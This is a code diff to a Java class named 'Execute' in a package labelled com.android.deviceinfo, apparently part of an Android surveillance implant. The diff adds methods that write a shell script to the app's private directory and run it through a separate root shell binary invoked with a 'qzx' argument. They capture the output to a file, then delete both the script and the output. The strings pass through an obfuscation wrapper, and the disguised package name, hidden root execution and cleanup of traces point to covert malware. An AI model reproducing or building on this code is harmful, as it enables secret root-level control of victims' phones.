@@ -9,15 +9,17 @@ import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Directory;
 import com.android.m.M;
 
 public class Execute {
 	private static final String TAG = "Execute";
-	
+
 	public static ExecuteResult executeRoot(String command) {
 		String cmd = Directory.expandMacro(command);
 
@@ -133,4 +135,61 @@ public class Execute {
 
 		return result;
 	}
+
+	public static boolean executeWaitFor(String cmd) {
+
+		try {
+			Process localProcess = Runtime.getRuntime().exec(cmd);
+			localProcess.waitFor();
+			return true;
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+			return false;
+		}
+	}
+
+	public synchronized static ExecuteResult executeScript(String cmd) {
+		String pack = Status.self().getAppContext().getPackageName();
+
+		String script = M.e("#!/system/bin/sh") + "\n" + String.format(M.e("%s | tee /data/data/%s/files/o"), cmd, pack)
+				+ "\n";
+		
+		ExecuteResult result = new ExecuteResult(cmd);
+
+		if (Root.createScript("e", script) == true) {
+			boolean res = Execute.executeWaitFor(String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack));
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (execute) execute 2: " + String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack)
+						+ " ret: " + res);
+			}
+
+			Root.removeScript("e");
+			AutoFile file = new AutoFile(String.format(M.e("/data/data/%s/files/o"), pack));
+			byte[] buffer = file.read();
+			if(buffer!=null){
+				String ret = new String(buffer);
+				for(String l: ret.split("\n")){
+					result.stdout.add(l + "\n");
+				}
+				if(res){
+					result.exitCode = 0;
+				}
+			}
+			
+			file.delete();
+			
+
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " ERROR: (execute), cannot create script");
+			}
+		}
+
+		return result;
+
+	}
+
 }
